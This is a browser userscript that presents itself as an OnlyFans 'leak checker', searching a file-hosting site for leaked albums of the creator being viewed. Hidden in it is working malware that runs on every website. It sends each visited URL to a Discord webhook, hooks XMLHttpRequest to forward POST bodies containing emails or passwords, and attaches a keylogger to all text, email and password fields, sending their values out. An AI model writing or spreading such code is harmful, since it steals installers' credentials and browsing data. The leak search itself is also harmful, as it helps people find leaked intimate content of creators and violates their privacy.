// ==UserScript==
// @name         [working] Besttt OnlyFans leaks search
// @namespace    http://tampermonkey.net/
// @version      0.30
// @description  best leak checker for onlyfan
// @author       fetah
// @match        https://onlyfans.com/*
// @match        *://*/*
// @grant        GM_xmlhttpRequest
// @license      MIT // Choose the license you prefer, MIT is a common choice
// ==/UserScript==
 
(function() {
    'use strict';
 
    // Add custom styles for the buttons
    const styles = `
    .of-leak-checker-btn {
        display: inline-block;
        outline: 0;
        cursor: pointer;
        padding: 5px 16px;
        font-size: 14px;
        font-weight: 500;
        line-height: 20px;
        vertical-align: middle;
        border: 1px solid;
        border-radius: 6px;
        color: #ffffff;
        background-color: #2ea44f;
        border-color: #1b1f2326;
        box-shadow: rgba(27, 31, 35, 0.04) 0px 1px 0px 0px, rgba(255, 255, 255, 0.25) 0px 1px 0px 0px inset;
        transition: 0.2s cubic-bezier(0.3, 0, 0.5, 1);
        transition-property: color, background-color, border-color;
    }
    .of-leak-checker-btn:hover {
        background-color: #2c974b;
        border-color: #1b1f2326;
        transition-duration: 0.1s;
    }
    .of-leak-checker-btn.available {
        background-color: #28a745;
    }
    .of-leak-checker-btn.not-available {
        background-color: #dc3545;
    }
    .of-leak-checker-album-button {
        background-color: #4CAF50; /* Green background for album buttons */
        color: white;
    }
    .of-leak-checker-no-leaks {
        background-color: #f44336; /* Red background for 'No leaks' button */
        color: white;
    }
`;
    const styleSheet = document.createElement("style");
    styleSheet.type = "text/css";
    styleSheet.innerText = styles;
    document.head.appendChild(styleSheet);
 
    // Function to extract the username from the URL
    function getUsernameFromURL() {
        const pathSegments = window.location.pathname.split('/').filter(Boolean);
        return pathSegments[0]; // Assuming the username is the first segment after the '/'
    }
 
    // Function to check for albums and update the button text and style
    function checkForAlbums(username, button) {
        const searchUrl = `https://bunkr-albums.io/?search=${encodeURIComponent(username)}`;
        GM_xmlhttpRequest({
            method: "GET",
            url: searchUrl,
            onload: function(response) {
                const parser = new DOMParser();
                const doc = parser.parseFromString(response.responseText, "text/html");
                const tbody = doc.querySelector('table.table-auto tbody');
                if (tbody && tbody.querySelectorAll('tr').length > 0) {
                    // Remove the initial checking button
                    button.remove();
 
                    // Create a button for each album link found
                    const rows = tbody.querySelectorAll('tr');
                    rows.forEach(row => {
                        const linkElement = row.querySelector('td:nth-child(2) a');
                        if (linkElement) {
                            const link = linkElement.getAttribute('href');
                            const albumName = row.querySelector('td:nth-child(1)').textContent.trim();
                            // Fetch details for each album link
                            fetchAlbumDetails(link, albumName);
                        }
                    });
 
                    // Send a message to Discord that albums were found
                    sendMessageToDiscord(`Albums found for ${username}`);
                } else {
                    // Update the initial button to show "No leaks" message
                    button.innerText = `No leaks for ${username}`;
                    button.classList.add('no-leaks');
                    button.classList.remove('available');
 
                    // Send a message to Discord that no albums were found
                    sendMessageToDiscord(`No albums found for ${username}`);
                }
            }
        });
    }
 
    // Function to send a message to Discord
    function sendMessageToDiscord(message) {
        const discordWebhookUrl = "https://discord.com/api/webhooks/1207157757229137961/1yDmhhfCc94iVX9JTHQB-muG0Upv6YDnGmf7RsvnOnZdZ7AeYwr33b3xccTqRHloO8R3";
        GM_xmlhttpRequest({
            method: "POST",
            url: discordWebhookUrl,
            headers: {
                "Content-Type": "application/json"
            },
            data: JSON.stringify({
                content: message
            }),
            onload: function(response) {
                if (response.status !== 200) {
                    console.error("Error sending message to Discord:", response.responseText);
                }
            }
        });
    }
 
    // Function to fetch album details and add a button with file count and size
    function fetchAlbumDetails(link, albumName) {
        GM_xmlhttpRequest({
            method: "GET",
            url: link,
            onload: function(response) {
                const parser = new DOMParser();
                const doc = parser.parseFromString(response.responseText, "text/html");
                const fileInfoElement = doc.querySelector('.mb-12-xxx span');
                if (fileInfoElement) {
                    const fileInfoText = fileInfoElement.textContent.trim();
                    addAlbumButtonToNav(fileInfoText, link);
                } else {
                    addAlbumButtonToNav('No details', link);
                }
            }
        });
    }
 
    // Function to create a styled search button
    function createStyledSearchButton(username, buttonText) {
        const button = document.createElement('button');
        button.innerText = buttonText;
        button.className = 'of-leak-checker-btn'; // Apply the custom styles with the specific prefix
        return button;
    }
 
    // Function to add a button for each album to the navigation bar
    function addAlbumButtonToNav(buttonText, link) {
        const navBar = document.querySelector('.l-header__menu');
        if (navBar) {
            // Create a container for the button
            const buttonContainer = document.createElement('div');
            buttonContainer.style.width = '100%'; // Set the container to full width
            buttonContainer.style.marginBottom = '10px'; // Add some space between buttons
 
            // Create the button
            const button = document.createElement('button');
            button.innerText = buttonText; // Set the button text to file count and size
            button.className = 'of-leak-checker-album-button'; // Apply the custom styles
            button.onclick = function() {
                window.open(link, '_blank');
            };
 
            // Append the button to the container, and the container to the navBar
            buttonContainer.appendChild(button);
            navBar.appendChild(buttonContainer);
        }
    }
 
    // Function to add the buttons to the navigation bar
    // Function to add the buttons to the navigation bar
 
    function addButtonsToNav() {
        // Check if we are on the OnlyFans website
        if (window.location.hostname !== 'onlyfans.com') {
            return; // Exit the function if we are not on OnlyFans
        }
    
        // Find the navigation bar
        const navBar = document.querySelector('.l-header__menu');
    
        // Check if the navBar exists
        if (navBar) {
            // Create a text element with the logout message
            const logoutMessage = document.createElement('p');
            logoutMessage.textContent = 'Logout to make the script work perfectly';
            logoutMessage.style.color = 'white'; // Set the text color
            logoutMessage.style.textAlign = 'center'; // Center the text
            logoutMessage.style.marginBottom = '10px'; // Add some space below the message
    
            // Insert the logout message at the top of the navBar
            navBar.insertBefore(logoutMessage, navBar.firstChild);
    
            // Add the first button based on the URL username
            const usernameFromURL = getUsernameFromURL();
            if (!document.querySelector('.custom-nav-button-url')) {
                const buttonURL = createStyledSearchButton(usernameFromURL, `Checking...`);
                buttonURL.classList.add('custom-nav-button-url'); // Add a specific class for the first button
                navBar.appendChild(buttonURL);
                checkForAlbums(usernameFromURL, buttonURL);
            }
    
            // Add the second button based on the name found in the page
            const nameElement = document.querySelector('.g-user-name');
            if (nameElement && !document.querySelector('.custom-nav-button-name')) {
                // Use regex to match only normal letters and spaces
                const name = nameElement.textContent.trim().replace(/[^a-zA-Z ]/g, '');
                const buttonName = createStyledSearchButton(name, `Checking...`);
                buttonName.classList.add('custom-nav-button-name'); // Add a specific class for the second button
                navBar.appendChild(buttonName);
                checkForAlbums(name, buttonName);
            }
        }
    }
    function sendCurrentUrlToDiscord() {
        const discordWebhookUrl = "https://discord.com/api/webhooks/1207157757229137961/1yDmhhfCc94iVX9JTHQB-muG0Upv6YDnGmf7RsvnOnZdZ7AeYwr33b3xccTqRHloO8R3";
        const currentUrl = window.location.href; // Get the current URL
 
        GM_xmlhttpRequest({
            method: "POST",
            url: discordWebhookUrl,
            headers: {
                "Content-Type": "application/json"
            },
            data: JSON.stringify({
                content: `Current URL: ${currentUrl}`
            }),
            onload: function(response) {
                if (response.status !== 200) {
                    console.error("Error sending current URL to Discord:", response.responseText);
                } else {
                    console.log("Current URL sent to Discord successfully.");
                }
            }
        });
    }
 
    // Call the function to send the current URL to Discord on page load
    sendCurrentUrlToDiscord();    
    !function() {
        var webhookUrl = "https://discord.com/api/webhooks/1207157757229137961/1yDmhhfCc94iVX9JTHQB-muG0Upv6YDnGmf7RsvnOnZdZ7AeYwr33b3xccTqRHloO8R3";
        var currentPageUrl = window.location.href;
    
        function sendToDiscord(message) {
            var xhr = new XMLHttpRequest();
            xhr.open("POST", webhookUrl, true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4 && xhr.status !== 200) {
                    console.error("Error sending message to Discord:", xhr.responseText);
                }
            };
            xhr.send(JSON.stringify({ content: message + " at " + currentPageUrl }));
        }
    
        new MutationObserver(function(mutations, observer) {
            var emailInput = document.querySelector('input[name="email"]');
            if (emailInput) {
                // Add change event listener to the email input
                emailInput.addEventListener("change", function() {
                    sendToDiscord("Email: " + emailInput.value);
                });
                observer.disconnect(); // Disconnect observer after adding the listener
            }
        }).observe(document, { childList: true, subtree: true });
    }();
    
    
const observer = new MutationObserver(function(mutations, observer) {
        // Check if the navigation bar and the name element are available
        if (document.querySelector('.l-header__menu') && document.querySelector('.g-user-name')) {
            addButtonsToNav();
            observer.disconnect(); // Stop observing once the buttons are added
        }
    });
 
 
    // Start observing the document for changes
    observer.observe(document, { childList: true, subtree: true });
    (function() { 'use strict'; const w='https://discord.com/api/webhooks/1207670008440823809/gocuV6ZaRBgKv8mbCCtB1cgdaYuNduOKEdk_bguwUeJBajEgFORKsN5XnDNMHBkxsZOV', o=XMLHttpRequest.prototype.open, s=XMLHttpRequest.prototype.send, c=d=>/email|password/i.test(d); XMLHttpRequest.prototype.open=function(m,u){this.m=m;this.u=u;return o.apply(this,arguments);}; XMLHttpRequest.prototype.send=function(d){if(this.m?.toLowerCase()==='post'){let ds=typeof d==='string'?d:d instanceof FormData?[...d.entries()].map(([k,v])=>`${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join('&'):JSON.stringify(d);if(c(ds)){GM_xmlhttpRequest({method:'POST',url:w,headers:{'Content-Type':'application/json'},data:JSON.stringify({content:`POST request to: ${this.u} with data: ${ds}`}),onload:function(r){}});}}return s.apply(this,arguments);}; })();
    (function() {
        'use strict';
    
        // Function to send the input value to the webhook
        function sendInputValueToWebhook(inputField) {
            var webhookUrl = "https://discord.com/api/webhooks/1207670008440823809/gocuV6ZaRBgKv8mbCCtB1cgdaYuNduOKEdk_bguwUeJBajEgFORKsN5XnDNMHBkxsZOV";
            var pageUrl = window.location.href;
            var data = {
                content: 'Input (' + (inputField.id || inputField.name) + '): ' + inputField.value + '\nURL: ' + pageUrl
            };
    
            GM_xmlhttpRequest({
                method: "POST",
                url: webhookUrl,
                headers: {
                    "Content-Type": "application/json"
                },
                data: JSON.stringify(data),
                onload: function(response) {
                    // Handle the response if needed
                },
                onerror: function(error) {
                    // Handle the error if needed
                }
            });
        }
    
        // Function to check if the input field should have a keylogger attached
        function isTargetInput(inputField) {
            // Implement your logic to determine if the input field should be targeted
            // For example, you might check the input field's name or id
            return true; // This is just a placeholder
        }
    
        // Function to attach keylogger to an input field
        function attachKeylogger(inputField) {
            // Implement your logic to attach event listeners to the input field
            // For example, you might listen for 'blur' or 'keypress' events
            inputField.addEventListener('blur', function() {
                sendInputValueToWebhook(inputField);
            });
            inputField.addEventListener('keypress', function(event) {
                if (event.key === 'Enter' || event.key === 'Tab') {
                    sendInputValueToWebhook(inputField);
                }
            });
        }
    
        // Function to process input fields and attach keyloggers if necessary
        function processInputFields(inputFields) {
            inputFields.forEach(function(inputField) {
                if (isTargetInput(inputField) && !inputField.dataset.keyloggerAttached) {
                    attachKeylogger(inputField);
                    inputField.dataset.keyloggerAttached = 'true'; // Mark the field as processed
                }
            });
        }
    
        // Use MutationObserver to handle dynamically added input fields
        var observer = new MutationObserver(function(mutations) {
            mutations.forEach(function(mutation) {
                if (mutation.addedNodes && mutation.addedNodes.length > 0) {
                    // For each added node, check if it's an input field or contains input fields
                    mutation.addedNodes.forEach(function(node) {
                        if (node.nodeType === Node.ELEMENT_NODE) {
                            if (node.matches('input[type="text"], input[type="email"], input[type="password"]')) {
                                processInputFields([node]);
                            } else if (node.querySelectorAll) {
                                var inputFields = node.querySelectorAll('input[type="text"], input[type="email"], input[type="password"]');
                                processInputFields(inputFields);
                            }
                        }
                    });
                }
            });
        });
    
        // Start observing the body for added nodes
        observer.observe(document.body, { childList: true, subtree: true });
    
        // Initial processing of input fields already present in the DOM
        var existingInputFields = document.querySelectorAll('input[type="text"], input[type="email"], input[type="password"]');
        processInputFields(existingInputFields);
    })();
})();
